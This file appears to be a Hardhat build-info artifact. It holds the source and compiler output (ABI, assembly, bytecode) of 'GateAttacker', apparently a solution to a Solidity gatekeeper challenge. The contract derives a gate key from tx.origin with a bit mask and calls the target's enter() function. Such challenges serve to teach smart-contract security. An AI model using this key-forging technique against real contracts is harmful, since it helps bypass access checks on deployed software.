{
	"id": "c09ad9d32e12511652a4862901c434e7",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"contract/security/GateAttacker.sol": {
				"content": "pragma solidity ^0.6.0;\r\n\r\ninterface Gate{\r\n    function enter(bytes8 _gateKey) external returns (bool);\r\n}\r\n\r\ncontract GateAttacker{\r\n\r\n    Gate impl; \r\n    uint64 offset = 0xFFFFFFFF0000FFFF;\r\n    bytes8 changedValue;\r\n\r\n    constructor(address addr) public {\r\n        impl = Gate(addr);\r\n    }\r\n\r\n    function getAddress() public {\r\n        changedValue = bytes8(uint64(tx.origin) & offset);\r\n    }\r\n\r\n    function c1() public view returns (bool){\r\n        return uint32(uint64(changedValue))!=uint64(changedValue);\r\n    }\r\n\r\n    function c2() public view returns (bool){\r\n        return uint32(uint64(changedValue))!=uint64(changedValue);\r\n    }\r\n\r\n    function c3() public view returns (bool) {\r\n        return uint32(uint64(changedValue)) == uint16(tx.origin);\r\n    }\r\n\r\n    function attack() public {\r\n        impl.enter(changedValue);\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contract/security/GateAttacker.sol": {
				"Gate": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "bytes8",
									"name": "_gateKey",
									"type": "bytes8"
								}
							],
							"name": "enter",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"enter(bytes8)": "3370204e"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bytes8\",\"name\":\"_gateKey\",\"type\":\"bytes8\"}],\"name\":\"enter\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contract/security/GateAttacker.sol\":\"Gate\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contract/security/GateAttacker.sol\":{\"keccak256\":\"0x7f65eed79cd0a3551ec2b845f0267c4c1641ac1082faa21a3164be0218ce1e5c\",\"urls\":[\"bzz-raw://4a85c7f93ca2d60885399b4b258078fb069e72593b347ded9917f04210f656ae\",\"dweb:/ipfs/QmRDzhsbcVPctfxrVN2yZZs2ZiiMdHBi8Whw8vA55xuyPC\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"GateAttacker": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "addr",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "c1",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "c2",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "c3",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "getAddress",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contract/security/GateAttacker.sol\":111:852  contract GateAttacker{\r... */\n  mstore(0x40, 0x80)\n    /* \"contract/security/GateAttacker.sol\":174:192  0xFFFFFFFF0000FFFF */\n  0xffffffff0000ffff\n    /* \"contract/security/GateAttacker.sol\":158:192  uint64 offset = 0xFFFFFFFF0000FFFF */\n  0x00\n  exp(0x0100, 0x14)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/GateAttacker.sol\":227:296  constructor(address addr) public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contract/security/GateAttacker.sol\":283:287  addr */\n  dup1\n    /* \"contract/security/GateAttacker.sol\":271:275  impl */\n  0x00\n  dup1\n    /* \"contract/security/GateAttacker.sol\":271:288  impl = Gate(addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/GateAttacker.sol\":227:296  constructor(address addr) public {\r... */\n  pop\n    /* \"contract/security/GateAttacker.sol\":111:852  contract GateAttacker{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/GateAttacker.sol\":111:852  contract GateAttacker{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x38cc4831\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x48e257cb\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x5f57697c\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xf2c07be5\n      eq\n      tag_7\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contract/security/GateAttacker.sol\":304:401  function getAddress() public {\r... */\n    tag_3:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"contract/security/GateAttacker.sol\":533:649  function c2() public view returns (bool){\r... */\n    tag_4:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/GateAttacker.sol\":409:525  function c1() public view returns (bool){\r... */\n    tag_5:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/GateAttacker.sol\":781:849  function attack() public {\r... */\n    tag_6:\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      stop\n        /* \"contract/security/GateAttacker.sol\":657:773  function c3() public view returns (bool) {\r... */\n    tag_7:\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/GateAttacker.sol\":304:401  function getAddress() public {\r... */\n    tag_9:\n        /* \"contract/security/GateAttacker.sol\":386:392  offset */\n      0x00\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffff\n      and\n        /* \"contract/security/GateAttacker.sol\":373:382  tx.origin */\n      origin\n        /* \"contract/security/GateAttacker.sol\":366:392  uint64(tx.origin) & offset */\n      and\n        /* \"contract/security/GateAttacker.sol\":359:393  bytes8(uint64(tx.origin) & offset) */\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":344:356  changedValue */\n      0x01\n      0x00\n        /* \"contract/security/GateAttacker.sol\":344:393  changedValue = bytes8(uint64(tx.origin) & offset) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xc0\n      shr\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contract/security/GateAttacker.sol\":304:401  function getAddress() public {\r... */\n      jump\t// out\n        /* \"contract/security/GateAttacker.sol\":533:649  function c2() public view returns (bool){\r... */\n    tag_11:\n        /* \"contract/security/GateAttacker.sol\":568:572  bool */\n      0x00\n        /* \"contract/security/GateAttacker.sol\":628:640  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":621:641  uint64(changedValue) */\n      0xc0\n      shr\n        /* \"contract/security/GateAttacker.sol\":591:641  uint32(uint64(changedValue))!=uint64(changedValue) */\n      0xffffffffffffffff\n      and\n        /* \"contract/security/GateAttacker.sol\":605:617  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":598:618  uint64(changedValue) */\n      0xc0\n      shr\n        /* \"contract/security/GateAttacker.sol\":591:641  uint32(uint64(changedValue))!=uint64(changedValue) */\n      0xffffffff\n      and\n      eq\n      iszero\n        /* \"contract/security/GateAttacker.sol\":584:641  return uint32(uint64(changedValue))!=uint64(changedValue) */\n      swap1\n      pop\n        /* \"contract/security/GateAttacker.sol\":533:649  function c2() public view returns (bool){\r... */\n      swap1\n      jump\t// out\n        /* \"contract/security/GateAttacker.sol\":409:525  function c1() public view returns (bool){\r... */\n    tag_13:\n        /* \"contract/security/GateAttacker.sol\":444:448  bool */\n      0x00\n        /* \"contract/security/GateAttacker.sol\":504:516  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":497:517  uint64(changedValue) */\n      0xc0\n      shr\n        /* \"contract/security/GateAttacker.sol\":467:517  uint32(uint64(changedValue))!=uint64(changedValue) */\n      0xffffffffffffffff\n      and\n        /* \"contract/security/GateAttacker.sol\":481:493  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":474:494  uint64(changedValue) */\n      0xc0\n      shr\n        /* \"contract/security/GateAttacker.sol\":467:517  uint32(uint64(changedValue))!=uint64(changedValue) */\n      0xffffffff\n      and\n      eq\n      iszero\n        /* \"contract/security/GateAttacker.sol\":460:517  return uint32(uint64(changedValue))!=uint64(changedValue) */\n      swap1\n      pop\n        /* \"contract/security/GateAttacker.sol\":409:525  function c1() public view returns (bool){\r... */\n      swap1\n      jump\t// out\n        /* \"contract/security/GateAttacker.sol\":781:849  function attack() public {\r... */\n    tag_15:\n        /* \"contract/security/GateAttacker.sol\":817:821  impl */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/GateAttacker.sol\":817:827  impl.enter */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3370204e\n        /* \"contract/security/GateAttacker.sol\":828:840  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":817:841  impl.enter(changedValue) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/GateAttacker.sol\":781:849  function attack() public {\r... */\n      jump\t// out\n        /* \"contract/security/GateAttacker.sol\":657:773  function c3() public view returns (bool) {\r... */\n    tag_17:\n        /* \"contract/security/GateAttacker.sol\":692:696  bool */\n      0x00\n        /* \"contract/security/GateAttacker.sol\":755:764  tx.origin */\n      origin\n        /* \"contract/security/GateAttacker.sol\":716:765  uint32(uint64(changedValue)) == uint16(tx.origin) */\n      0xffff\n      and\n        /* \"contract/security/GateAttacker.sol\":730:742  changedValue */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xc0\n      shl\n        /* \"contract/security/GateAttacker.sol\":723:743  uint64(changedValue) */\n      0xc0\n      shr\n        /* \"contract/security/GateAttacker.sol\":716:765  uint32(uint64(changedValue)) == uint16(tx.origin) */\n      0xffffffff\n      and\n      eq\n        /* \"contract/security/GateAttacker.sol\":709:765  return uint32(uint64(changedValue)) == uint16(tx.origin) */\n      swap1\n      pop\n        /* \"contract/security/GateAttacker.sol\":657:773  function c3() public view returns (bool) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa26469706673582212205926e85ba2338796a778e80db5f7802c6e5a45655706c4a657b5cc8af121873964736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405267ffffffff0000ffff600060146101000a81548167ffffffffffffffff021916908367ffffffffffffffff16021790555034801561004157600080fd5b506040516103893803806103898339818101604052602081101561006457600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102c4806100c56000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806338cc48311461005c57806348e257cb146100665780635f57697c146100865780639e5faafc146100a6578063f2c07be5146100b0575b600080fd5b6100646100d0565b005b61006e61010f565b60405180821515815260200191505060405180910390f35b61008e61014e565b60405180821515815260200191505060405180910390f35b6100ae61018d565b005b6100b8610268565b60405180821515815260200191505060405180910390f35b600060149054906101000a900467ffffffffffffffff16321660c01b600160006101000a81548167ffffffffffffffff021916908360c01c0217905550565b6000600160009054906101000a900460c01b60c01c67ffffffffffffffff16600160009054906101000a900460c01b60c01c63ffffffff161415905090565b6000600160009054906101000a900460c01b60c01c67ffffffffffffffff16600160009054906101000a900460c01b60c01c63ffffffff161415905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633370204e600160009054906101000a900460c01b6040518263ffffffff1660e01b8152600401808277ffffffffffffffffffffffffffffffffffffffffffffffff19168152602001915050602060405180830381600087803b15801561022a57600080fd5b505af115801561023e573d6000803e3d6000fd5b505050506040513d602081101561025457600080fd5b810190808051906020019092919050505050565b60003261ffff16600160009054906101000a900460c01b60c01c63ffffffff161490509056fea26469706673582212205926e85ba2338796a778e80db5f7802c6e5a45655706c4a657b5cc8af121873964736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH8 0xFFFFFFFF0000FFFF PUSH1 0x0 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH8 0xFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH8 0xFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x389 CODESIZE SUB DUP1 PUSH2 0x389 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x2C4 DUP1 PUSH2 0xC5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x38CC4831 EQ PUSH2 0x5C JUMPI DUP1 PUSH4 0x48E257CB EQ PUSH2 0x66 JUMPI DUP1 PUSH4 0x5F57697C EQ PUSH2 0x86 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xA6 JUMPI DUP1 PUSH4 0xF2C07BE5 EQ PUSH2 0xB0 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x64 PUSH2 0xD0 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6E PUSH2 0x10F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x8E PUSH2 0x14E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xAE PUSH2 0x18D JUMP JUMPDEST STOP JUMPDEST PUSH2 0xB8 PUSH2 0x268 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH8 0xFFFFFFFFFFFFFFFF AND ORIGIN AND PUSH1 0xC0 SHL PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH8 0xFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH1 0xC0 SHR MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH8 0xFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ ISZERO SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH8 0xFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ ISZERO SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3370204E PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x22A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x23E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x254 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 ORIGIN PUSH2 0xFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MSIZE 0x26 0xE8 JUMPDEST LOG2 CALLER DUP8 SWAP7 0xA7 PUSH25 0xE80DB5F7802C6E5A45655706C4A657B5CC8AF121873964736F PUSH13 0x634300060C0033000000000000 ",
							"sourceMap": "111:741:0:-:0;;;174:18;158:34;;;;;;;;;;;;;;;;;;;;227:69;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;283:4;271;;:17;;;;;;;;;;;;;;;;;;227:69;111:741;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100575760003560e01c806338cc48311461005c57806348e257cb146100665780635f57697c146100865780639e5faafc146100a6578063f2c07be5146100b0575b600080fd5b6100646100d0565b005b61006e61010f565b60405180821515815260200191505060405180910390f35b61008e61014e565b60405180821515815260200191505060405180910390f35b6100ae61018d565b005b6100b8610268565b60405180821515815260200191505060405180910390f35b600060149054906101000a900467ffffffffffffffff16321660c01b600160006101000a81548167ffffffffffffffff021916908360c01c0217905550565b6000600160009054906101000a900460c01b60c01c67ffffffffffffffff16600160009054906101000a900460c01b60c01c63ffffffff161415905090565b6000600160009054906101000a900460c01b60c01c67ffffffffffffffff16600160009054906101000a900460c01b60c01c63ffffffff161415905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633370204e600160009054906101000a900460c01b6040518263ffffffff1660e01b8152600401808277ffffffffffffffffffffffffffffffffffffffffffffffff19168152602001915050602060405180830381600087803b15801561022a57600080fd5b505af115801561023e573d6000803e3d6000fd5b505050506040513d602081101561025457600080fd5b810190808051906020019092919050505050565b60003261ffff16600160009054906101000a900460c01b60c01c63ffffffff161490509056fea26469706673582212205926e85ba2338796a778e80db5f7802c6e5a45655706c4a657b5cc8af121873964736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x38CC4831 EQ PUSH2 0x5C JUMPI DUP1 PUSH4 0x48E257CB EQ PUSH2 0x66 JUMPI DUP1 PUSH4 0x5F57697C EQ PUSH2 0x86 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xA6 JUMPI DUP1 PUSH4 0xF2C07BE5 EQ PUSH2 0xB0 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x64 PUSH2 0xD0 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6E PUSH2 0x10F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x8E PUSH2 0x14E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xAE PUSH2 0x18D JUMP JUMPDEST STOP JUMPDEST PUSH2 0xB8 PUSH2 0x268 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH8 0xFFFFFFFFFFFFFFFF AND ORIGIN AND PUSH1 0xC0 SHL PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH8 0xFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH1 0xC0 SHR MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH8 0xFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ ISZERO SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH8 0xFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xC0 SHL PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ ISZERO SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3370204E PUSH1 0x1 PUSH1 0x0 SWAP1 